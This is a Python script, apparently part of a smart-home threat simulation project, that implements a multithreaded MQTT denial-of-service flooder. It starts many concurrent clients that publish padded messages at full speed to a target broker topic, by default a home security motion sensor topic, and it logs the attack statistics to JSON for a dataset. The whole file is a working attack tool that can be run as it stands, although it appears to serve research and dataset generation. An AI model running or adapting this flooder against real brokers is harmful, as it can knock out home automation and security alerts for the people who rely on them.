import paho.mqtt.client as mqtt
import time
import argparse
import threading
import json
import os
import random

# Configuration for logging
LOG_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def flood_worker(broker, port, topic, rate, duration, results, worker_id):
    """
    Floods the broker with messages as fast as possible or at a specified rate.
    """
    client_id = f"dos_attacker_{worker_id}_{random.randint(1000, 9999)}"
    client = mqtt.Client(client_id)
    
    try:
        client.connect(broker, port, 60)
    except Exception as e:
        print(f"[Worker {worker_id}] Connection Failed: {e}")
        return

    sent_count = 0
    end_time = time.time() + duration
    
    while time.time() < end_time:
        payload = json.dumps({
            "timestamp": time.time(),
            "data": "A" * 128,  # Large payload to increase stress
            "type": "flood_test"
        })
        
        info = client.publish(topic, payload, qos=0)
        # info.wait_for_publish() # Blocking wait is slower, but QoS 0 is fire-and-forget
        sent_count += 1
        
        if rate > 0:
            time.sleep(1.0 / rate)
            
    client.disconnect()
    results[worker_id] = sent_count

def main():
    parser = argparse.ArgumentParser(description="Advanced MQTT DoS Attack Simulator")
    parser.add_argument("--broker", default="192.168.1.100", help="MQTT Broker IP")
    parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
    parser.add_argument("--topic", default="shtsp/home/security/motion", help="Target Topic to flood")
    parser.add_argument("--clients", type=int, default=10, help="Number of concurrent attack clients")
    parser.add_argument("--rate", type=float, default=0, help="Messages per second per client (0 for max speed)")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--log", action="store_true", help="Enable logging to JSON for dataset")
    
    args = parser.parse_args()

    print(f"🔥 Starting Advanced DoS Attack on {args.broker}:{args.port}")
    print(f"🎯 Target Topic: {args.topic}")
    print(f"👥 Attack Clients: {args.clients}")
    print(f"⏳ Duration: {args.duration}s")
    print("-" * 50)

    results = {}
    threads = []
    start_time = time.time()

    for i in range(args.clients):
        t = threading.Thread(target=flood_worker, args=(args.broker, args.port, args.topic, args.rate, args.duration, results, i))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    end_time = time.time()
    total_sent = sum(results.values())
    avg_rate = total_sent / args.duration

    print("-" * 50)
    print(f"🏁 Attack Completed")
    print(f"📦 Total Messages Sent: {total_sent}")
    print(f"📈 Average Rate: {avg_rate:.2f} msg/s")

    if args.log:
        log_data = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "attack_type": "dos_flood",
            "target": f"{args.broker}:{args.port}",
            "topic": args.topic,
            "clients": args.clients,
            "duration": args.duration,
            "total_messages": total_sent,
            "average_rate": avg_rate
        }
        log_file = os.path.join(LOG_DIR, f"dos_{int(time.time())}.json")
        with open(log_file, 'w') as f:
            json.dump(log_data, f, indent=4)
        print(f"📊 Results logged to: {log_file}")

if __name__ == "__main__":
    main()
